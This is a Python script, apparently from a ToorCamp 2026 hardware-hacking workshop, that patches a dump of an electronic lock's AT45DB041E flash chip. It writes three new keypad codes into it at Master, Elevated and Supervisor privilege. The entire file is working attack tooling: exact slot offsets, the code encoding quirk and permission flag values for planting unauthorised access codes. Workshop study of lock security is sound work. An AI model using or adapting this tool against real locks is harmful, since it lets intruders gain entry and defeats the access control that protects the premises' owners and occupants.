#!/usr/bin/env python3
"""
build-injected.py — Construct an injected.bin from a chip dump + patch table.

Reads a 540,672-byte AT45DB041E dump, applies a 15-byte patch (three user
codes at three permission levels in three scattered slots), and writes the
result. Intended for the ToorCamp 2026 "Dead Bytes Tell No Lies" workshop.

Usage:
    python3 build-injected.py my-dump.bin injected.bin
"""

import argparse
import sys

DUMP_SIZE = 540_672          # AT45DB041E main array: 2048 pages * 264 bytes
# Page-0 user-code page marker. The marker is the LOW NIBBLE of byte 0 (0xD),
# not the whole byte. Across 14+ independent lock dumps (the canonical baseline
# plus the original research corpus) every valid user-code page has byte 0
# low-nibble == 0xD; factory/unmodified locks read 0xFD, but a keypad-
# reprogrammed lock (a second board) reads 0x1D — same low nibble, different
# high nibble. The high nibble is a variable firmware status/sequence field
# (deep analysis deferred to follow-up testing); the low nibble 0xD is the stable
# page-type marker. See DATAFLASH-DECODE-REFERENCE.md §2. Blank (0x00) and
# erased (0xFF) reads fail the low-nibble test and are still rejected.
PAGE0_MARKER_LOW_NIBBLE = 0x0D   # byte0 & 0x0F must equal this
FACTORY_HIGH_NIBBLE = 0xF        # factory-state high nibble; != is informational
MAX_SLOT = 49                # Slots 0..49 inclusive

# Valid permission flag values per DATAFLASH-DECODE-REFERENCE.md §4:
#   F1 Master  E1 Elevated  C1 Supervisor  01 Normal  11/21/31/41 other roles
#   FF empty.
VALID_PERMS = {0x01, 0x11, 0x21, 0x31, 0x41, 0xC1, 0xE1, 0xF1, 0xFF}

# Slot N region map per DATAFLASH-DECODE-REFERENCE.md §4.
# Every region is a contiguous 50-byte band starting at the base offset; the
# byte for slot N lives at base + N.
OFF_CODE_BYTE_1 = 0x0001
OFF_CODE_BYTE_2 = 0x0033
OFF_CODE_BYTE_3 = 0x0065
OFF_ACTIVE      = 0x0097
OFF_PERM        = 0x00C9

# Canonical workshop patch table — the canonical 3-slot workshop payload.
DEFAULT_PATCHES = [
    {"slot": 19, "code": "133769", "perm": 0xF1, "perm_name": "Master"},
    {"slot": 32, "code": "420420", "perm": 0xE1, "perm_name": "Elevated"},
    {"slot": 49, "code": "696969", "perm": 0xC1, "perm_name": "Supervisor"},
]


def encode_code(code: str) -> tuple[int, int, int]:
    """Encode a 6-digit decimal code as 3 packed-BCD bytes.

    Digit 0 is stored as nibble value 0xB, not 0x0 and not ASCII 0x30. This is
    the AT45DB041E user-code-page encoding rule per DATAFLASH-DECODE-REFERENCE.md §3a; it
    is the rule slot 32's `420420` exercises in the workshop. The lock firmware
    will not honor a code with literal-zero nibbles.
    """
    if len(code) != 6 or not code.isdigit():
        raise ValueError(f"code {code!r} must be exactly 6 decimal digits")

    nibbles = [0xB if d == "0" else int(d) for d in code]
    b1 = (nibbles[0] << 4) | nibbles[1]
    b2 = (nibbles[2] << 4) | nibbles[3]
    b3 = (nibbles[4] << 4) | nibbles[5]
    return b1, b2, b3


def slot_offsets(slot: int) -> dict:
    """Five file offsets for slot N — code byte 1/2/3, active flag, permission."""
    return {
        "code_b1": OFF_CODE_BYTE_1 + slot,
        "code_b2": OFF_CODE_BYTE_2 + slot,
        "code_b3": OFF_CODE_BYTE_3 + slot,
        "active":  OFF_ACTIVE + slot,
        "perm":    OFF_PERM + slot,
    }


def validate_baseline(data: bytes, path: str) -> None:
    if len(data) != DUMP_SIZE:
        sys.exit(
            f"ERROR: {path} is {len(data)} bytes; expected {DUMP_SIZE} "
            f"(AT45DB041E main array, 2048 pages * 264 bytes). "
            f"If your dump is 540,800 bytes, it includes the 128-byte "
            f"Security Register — trim the trailing 128 bytes first."
        )
    if (data[0] & 0x0F) != PAGE0_MARKER_LOW_NIBBLE:
        sys.exit(
            f"ERROR: {path} byte 0 = 0x{data[0]:02X}; its low nibble "
            f"0x{data[0] & 0x0F:X} is not the expected page-0 user-code marker "
            f"0x{PAGE0_MARKER_LOW_NIBBLE:X} (factory locks read 0xFD, "
            f"keypad-reprogrammed locks read e.g. 0x1D — both low-nibble 0xD). "
            f"This does not look like a valid page-0 dump. An all-0x00 (blank) "
            f"or all-0xFF (erased) read fails here, as it should — re-read the "
            f"chip and check clip contact."
        )
    if (data[0] >> 4) != FACTORY_HIGH_NIBBLE:
        # Non-fatal: the low nibble already confirmed a valid page-0 marker.
        # A non-F high nibble means the lock was keypad-reprogrammed (or is in
        # a non-factory firmware state); proceed but inform the facilitator.
        print(
            f"NOTE: {path} byte 0 = 0x{data[0]:02X} — header high-nibble "
            f"0x{data[0] >> 4:X}, expected 0x{FACTORY_HIGH_NIBBLE:X} for a "
            f"factory-state lock. This lock appears keypad-reprogrammed; "
            f"proceeding (low-nibble 0xD marker is valid)."
        )


def validate_patches(patches: list[dict]) -> None:
    seen_slots = set()
    for p in patches:
        slot = p["slot"]
        if not (0 <= slot <= MAX_SLOT):
            sys.exit(f"ERROR: slot {slot} out of range 0..{MAX_SLOT}")
        if slot in seen_slots:
            sys.exit(f"ERROR: slot {slot} appears twice in the patch table")
        seen_slots.add(slot)

        code = p["code"]
        if len(code) != 6 or not code.isdigit():
            sys.exit(f"ERROR: slot {slot} code {code!r} must be exactly 6 decimal digits")

        perm = p["perm"]
        if perm not in VALID_PERMS:
            valid = ", ".join(f"0x{v:02X}" for v in sorted(VALID_PERMS))
            sys.exit(f"ERROR: slot {slot} permission 0x{perm:02X} not in valid set ({valid})")


def apply_patches(baseline: bytes, patches: list[dict]) -> tuple[bytearray, list[dict]]:
    """Return (injected_bytes, list_of_byte_changes)."""
    injected = bytearray(baseline)
    changes = []

    for p in patches:
        slot = p["slot"]
        b1, b2, b3 = encode_code(p["code"])
        offs = slot_offsets(slot)

        writes = [
            ("code byte 1", offs["code_b1"], b1),
            ("code byte 2", offs["code_b2"], b2),
            ("code byte 3", offs["code_b3"], b3),
            ("active flag", offs["active"],  0x01),
            ("permission",  offs["perm"],    p["perm"]),
        ]
        for field, off, new in writes:
            before = injected[off]
            injected[off] = new
            changes.append({
                "slot": slot,
                "code": p["code"],
                "perm_name": p["perm_name"],
                "field": field,
                "off": off,
                "before": before,
                "after": new,
            })

    return injected, changes


def print_changes(changes: list[dict]) -> None:
    print()
    print(f"Applied {len(changes)} byte changes:")
    print()
    print(f"  {'slot':>4}  {'code':>6}  {'permission':>10}  {'field':<12}  offset    before  after")
    print(f"  {'-'*4}  {'-'*6}  {'-'*10}  {'-'*12}  {'-'*6}    {'-'*6}  {'-'*5}")

    last_slot = None
    for c in changes:
        if last_slot is not None and c["slot"] != last_slot:
            print()
        slot_col = f"{c['slot']:>4}" if c["slot"] != last_slot else "    "
        code_col = f"{c['code']:>6}" if c["slot"] != last_slot else "      "
        perm_col = f"{c['perm_name']:>10}" if c["slot"] != last_slot else "          "
        print(
            f"  {slot_col}  {code_col}  {perm_col}  "
            f"{c['field']:<12}  0x{c['off']:04X}    "
            f"0x{c['before']:02X}    0x{c['after']:02X}"
        )
        last_slot = c["slot"]
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Build an injected.bin from an AT45DB041E chip dump + patch table. "
            "Defaults to the canonical 3-slot ToorCamp 2026 workshop patch."
        )
    )
    parser.add_argument("baseline", help="path to a 540,672-byte AT45DB041E dump")
    parser.add_argument("output", help="path to write the injected dump")
    args = parser.parse_args()

    with open(args.baseline, "rb") as f:
        baseline = f.read()
    validate_baseline(baseline, args.baseline)

    patches = DEFAULT_PATCHES
    validate_patches(patches)

    injected, changes = apply_patches(baseline, patches)

    with open(args.output, "wb") as f:
        f.write(injected)

    print_changes(changes)
    print(f"Wrote {args.output} ({len(injected):,} bytes).")
    print(f"Run: md5sum {args.output}")
    print(f"Expected MD5 for the canonical workshop patch against the canonical baseline:")
    print(f"  741dcc79d9975b956d9e1c0a14de0e2b")


if __name__ == "__main__":
    main()
